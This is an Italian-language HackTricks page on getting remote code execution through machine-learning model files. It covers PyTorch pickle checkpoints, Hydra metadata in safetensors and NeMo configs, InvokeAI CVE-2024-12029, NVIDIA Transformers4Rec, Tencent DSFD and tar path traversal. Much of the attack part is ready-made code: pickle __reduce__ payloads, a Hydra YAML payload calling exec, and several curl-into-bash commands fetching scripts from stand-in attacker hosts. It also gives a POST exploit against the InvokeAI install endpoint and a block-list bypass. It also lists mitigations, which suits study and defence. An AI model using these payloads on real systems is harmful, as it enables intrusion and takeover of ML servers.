# Modelli RCE

{{#include ../banners/hacktricks-training.md}}

## Caricamento modelli per RCE

I modelli di Machine Learning sono solitamente condivisi in diversi formati, come ONNX, TensorFlow, PyTorch, ecc. Questi modelli possono essere caricati sulle macchine degli sviluppatori o in sistemi di produzione per essere utilizzati. Di norma i modelli non dovrebbero contenere codice malevolo, ma esistono alcuni casi in cui il modello può essere usato per eseguire codice arbitrario sul sistema come funzionalità voluta o a causa di una vulnerabilità nella libreria di caricamento del modello.

Al momento della stesura, ecco alcuni esempi di questo tipo di vulnerabilità:

| **Framework / Tool**        | **Vulnerabilità (CVE se disponibile)**                                                    | **Vettore RCE**                                                                                                                           | **Riferimenti**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserializzazione insicura in* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malevolo nel checkpoint del modello porta all'esecuzione di codice (bypassando la protezione `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + download di modello malevolo causa esecuzione di codice; deserializzazione Java RCE nell'API di management                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserializzazione insicura del checkpoint tramite `torch.load` **(CVE-2025-23298)**                                           | Checkpoint non attendibile attiva il reducer di pickle durante `load_model_trainer_states_from_checkpoint` → esecuzione di codice nel worker ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML insicuro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Caricare un modello da YAML usa `yaml.unsafe_load` (esecuzione di codice) <br> Caricare un modello con layer **Lambda** esegue codice Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parsing TFLite)                                                                                          | Un `.tflite` appositamente costruito innesca un overflow di intero → corruzione dell'heap (potenziale RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Caricare un modello tramite `joblib.load` esegue il pickle con il payload `__reduce__` dell'attaccante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (uso insicuro di `np.load`) *contestato*                                                                              | `numpy.load` di default permetteva array di oggetti pickled – `.npy/.npz` malevoli possono innescare esecuzione di codice                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Il percorso delle external-weights di un modello ONNX può uscire dalla directory (leggere file arbitrari) <br> Un tar ONNX malevolo può sovrascrivere file arbitrari (portando a RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Un modello con operatori custom richiede il caricamento di codice nativo dell'attaccante; grafi modello complessi possono abusare della logica per eseguire computazioni non volute   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Usare l'API di caricamento modelli con `--model-control` abilitato permette traversal relativo di percorso per scrivere file (es. sovrascrivere `.bashrc` per ottenere RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (più heap overflow)                                                                         | File modello GGUF malformato causa overflow di buffer nell'analizzatore, abilitando l'esecuzione di codice arbitrario sul sistema vittima                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Un modello HDF5 (`.h5`) malevolo con layer Lambda esegue ancora codice al caricamento (Keras safe_mode non copre il vecchio formato – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Molti strumenti ML (es. formati modello basati su pickle, Python `pickle.load`) eseguiranno codice arbitrario incorporato nei file modello se non mitigati | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadati non affidabili passati a `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | I metadati/config del modello controllati dall'attaccante impostano `_target_` su una callable arbitraria (es. `builtins.exec`) → eseguita durante il caricamento, anche con formati “sicuri” (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Inoltre, esistono alcuni modelli basati su pickle in Python come quelli usati da [PyTorch](https://github.com/pytorch/pytorch/security) che possono essere sfruttati per eseguire codice arbitrario sul sistema se non vengono caricati con `weights_only=True`. Quindi, qualsiasi modello basato su pickle potrebbe essere particolarmente suscettibile a questo tipo di attacchi, anche se non è elencato nella tabella sopra.

### Metadati Hydra → RCE (funziona anche con safetensors)

`hydra.utils.instantiate()` importa e richiama qualsiasi `_target_` puntato da notazione dotted in un oggetto di configurazione/metadati. Quando le librerie forniscono **metadati modello non affidabili** a `instantiate()`, un attaccante può fornire una callable e argomenti che vengono eseguiti immediatamente durante il caricamento del modello (nessun pickle richiesto).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Punti chiave:
- Attivato prima dell'inizializzazione del modello in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders e FlexTok loaders.
- La string block-list di Hydra può essere bypassata tramite percorsi di import alternativi (es., `enum.bltns.eval`) o nomi risolti dall'applicazione (es., `nemo.core.classes.common.os.system` → `posix`).
- FlexTok esegue anche il parsing di metadata stringificati con `ast.literal_eval`, permettendo DoS (CPU/memory blowup) prima della chiamata a Hydra.

### 🆕  InvokeAI RCE tramite `torch.load` (CVE-2024-12029)

`InvokeAI` è una popolare interfaccia web open-source per Stable-Diffusion. Le versioni **5.3.1 – 5.4.2** espongono l'endpoint REST `/api/v2/models/install` che permette agli utenti di scaricare e caricare modelli da URL arbitrari.

Internamente l'endpoint alla fine chiama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando il file fornito è un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` esegue una **pickle deserialization**. Poiché il contenuto proviene direttamente da un URL controllato dall'utente, un attaccante può inserire un oggetto malevolo con un metodo personalizzato `__reduce__` all'interno del checkpoint; il metodo viene eseguito **during deserialization**, portando a **remote code execution (RCE)** sul server InvokeAI.

La vulnerabilità è stata assegnata **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Procedura di sfruttamento

1. Crea un checkpoint malevolo:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Ospita `payload.ckpt` su un server HTTP che controlli (es. `http://ATTACKER/payload.ckpt`).
3. Trigger l'endpoint vulnerabile (nessuna autenticazione richiesta):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Quando InvokeAI scarica il file chiama `torch.load()` → il gadget `os.system` viene eseguito e l'attaccante ottiene esecuzione di codice nel contesto del processo InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizza l'intero flusso.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag predefinito **false**)  
•  `/api/v2/models/install` raggiungibile dall'attaccante  
•  Il processo ha i permessi per eseguire comandi shell

#### Mitigations

* Aggiornare a **InvokeAI ≥ 5.4.3** – la patch imposta `scan=True` di default ed esegue la scansione per malware prima della deserializzazione.  
* Quando si caricano checkpoint programmaticamente usare `torch.load(file, weights_only=True)` o il nuovo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Applicare allow-lists / signatures per le sorgenti dei modelli ed eseguire il servizio con il minimo privilegio necessario.

> ⚠️ Ricorda che **qualsiasi** formato basato su Python pickle (inclusi molti `.pt`, `.pkl`, `.ckpt`, `.pth` files) è intrinsecamente insicuro da deserializzare da fonti non attendibili.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE tramite `torch.load` non sicuro (CVE-2025-23298)

Transformers4Rec di NVIDIA (parte di Merlin) esponeva un loader di checkpoint non sicuro che chiamava direttamente `torch.load()` su percorsi forniti dall'utente. Poiché `torch.load` si basa su Python `pickle`, un checkpoint controllato dall'attaccante può eseguire codice arbitrario tramite un reducer durante la deserializzazione.

Percorso vulnerabile (prima della correzione): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Perché questo porta a RCE: In Python `pickle`, un oggetto può definire un reducer (`__reduce__`/`__setstate__`) che restituisce una callable e gli argomenti. La callable viene eseguita durante la deserializzazione. Se un tale oggetto è presente in un checkpoint, viene eseguito prima che vengano usati i pesi.

Esempio minimo di checkpoint malevolo:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vettori di consegna e raggio d'impatto:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Correzione: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ha sostituito la chiamata diretta `torch.load()` con un deserializzatore ristretto e allow-listed implementato in `transformers4rec/utils/serialization.py`. Il nuovo loader valida tipi/campi e impedisce che callables arbitrarie vengano invocate durante il load.

Linee guida difensive specifiche per i checkpoint PyTorch:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC e riferimenti a vulnerabilità/patch:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Esempio – creare un modello PyTorch malevolo

- Crea il modello:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carica il modello:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD espone un endpoint `resnet` che deserializza dati controllati dall'utente. ZDI ha confermato che un attaccante remoto può costringere una vittima a caricare una pagina/file malevoli, far sì che invii un blob serializzato appositamente creato a quell'endpoint e inneschi la deserializzazione come `root`, portando alla compromissione completa.

Il flusso dell'exploit rispecchia il tipico abuso di pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Qualsiasi gadget raggiungibile durante la deserialization (constructors, `__setstate__`, framework callbacks, ecc.) può essere weaponized allo stesso modo, indipendentemente dal fatto che il trasporto sia HTTP, WebSocket o un file depositato in una watched directory.


## Modelli per Path Traversal

Come commentato in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la maggior parte dei formati dei modelli usati dai diversi AI frameworks si basa su archivi, di solito `.zip`. Pertanto, potrebbe essere possibile abusare di questi formati per eseguire path traversal attacks, permettendo di leggere file arbitrari dal sistema in cui il modello viene caricato.

Per esempio, con il seguente codice puoi creare un modello che creerà un file nella directory `/tmp` quando viene caricato:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oppure, con il seguente codice puoi creare un modello che creerà un symlink alla directory `/tmp` quando viene caricato:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Approfondimento: Keras .keras deserialization and gadget hunting

Per una guida mirata su .keras internals, Lambda-layer RCE, il problema arbitrary import in ≤ 3.8 e la scoperta di post-fix gadget all'interno della allowlist, vedi:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Riferimenti

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
